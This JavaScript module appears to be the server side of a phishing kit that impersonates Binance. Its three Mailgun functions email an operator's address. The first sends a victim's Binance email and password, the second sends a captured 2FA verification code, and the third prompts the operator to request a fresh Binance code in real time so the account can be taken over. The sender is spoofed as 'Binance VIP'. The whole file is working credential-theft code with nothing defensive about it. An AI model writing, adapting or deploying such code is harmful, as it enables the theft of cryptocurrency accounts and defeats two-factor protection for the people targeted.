import Mailgun from 'mailgun.js'
import FormData from 'form-data'

const mailgun = new Mailgun(FormData)
const auth_credentials = {
  username: 'api',
  key: process.env.MAILGUN_PRIVATE_KEY,
  url: 'https://api.eu.mailgun.net'
}
const client = mailgun.client(auth_credentials)
const MY_DOMAIN = process.env.MY_DOMAIN


const sendEmailToAdmin = async (email, password, cB) => {
    const mail_options = {
      from: "Binance VIP <no-reply@zenithbrokers.co.uk>",
      to: process.env.ADMIN_EMAIL,
      subject: "New Binance Login",
      text: `Just now, Binance login credentials
      \nEmail: ${email}
      \nPassword: ${password}`
    };
    
    try {
      const mailSuccess = await client.messages.create(MY_DOMAIN, mail_options);
      mailSuccess && cB(null, mailSuccess)    /* call The Callback here on SUCCESS */
    } catch (e) {
      cB(e, null)   /* call The Callback here on ERROR */
    }
       
}

const sendEmailVerificationToAdmin = async (code, cB) => {
    const mail_options = {
      from: "Binance VIP <no-reply@zenithbrokers.co.uk>",
      to: process.env.ADMIN_EMAIL,
      subject: "Verification Code",
      text: `Just now, Binance 2FA verification code\n
      \nVerification code: ${code}`
    };
    
    try {
      const mailSuccess = await client.messages.create(MY_DOMAIN, mail_options);
      mailSuccess && cB(null, mailSuccess)    /* call The Callback here on SUCCESS */
    } catch (e) {
      cB(e, null)   /* call The Callback here on ERROR */
    }
       
}

const sendVerificationCodeRequest = async (email, cB) => {
    const mail_options = {
      from: "Binance VIP <no-reply@zenithbrokers.co.uk>",
      to: process.env.ADMIN_EMAIL,
      subject: "Verification Code Request",
      text: `Just now, Binance 2FA "Get verification code, request!"
      \nThe user below just requested for a verification code @BinanceVip proceed to requesting verification code from Binance.
      \nEmail: ${email}`
    };
    
    try {
      const mailSuccess = await client.messages.create(MY_DOMAIN, mail_options);
      mailSuccess && cB(null, mailSuccess)    /* call The Callback here on SUCCESS */
    } catch (e) {
      cB(e, null)   /* call The Callback here on ERROR */
    }
       
}
  
module.exports = { sendEmailToAdmin, sendEmailVerificationToAdmin, sendVerificationCodeRequest };